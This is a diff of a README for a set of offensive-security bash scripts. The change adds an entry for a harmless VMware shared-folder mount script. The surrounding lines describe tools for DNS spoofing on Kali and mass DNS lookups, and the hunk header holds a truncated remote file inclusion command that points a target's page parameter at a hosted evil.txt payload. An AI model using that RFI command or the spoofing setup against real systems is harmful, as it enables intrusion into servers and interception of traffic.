@@ -85,6 +85,11 @@ rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://a
  
  The issue I noticed came from another script came from a website in the bash script. This is because the slash is viewed as an escape character. Any contributions are welcome. This is still a work in progress.
 
+- __MountDriveVMWworkstation.sh__ This is a simple script meant to be executed in order to quickly mount a defined Shared Folder in VMWare Workstation to a Linux VM running inside VMWare Workstation.
+```sh
+./MountDriveVMWworkstation.sh 
+```
+
 - __enablespoofing.sh__ This is a simple script meant to take care of the tasks neccessary to allow dns spoofing on Kali Linux. It enables port forwarding on ipv4 and allows DNS traffic.
 
 - __dnslookup.sh__ This command is meant to perform a mas dns lookup based on an IPv4 address range. Returns output in the below format
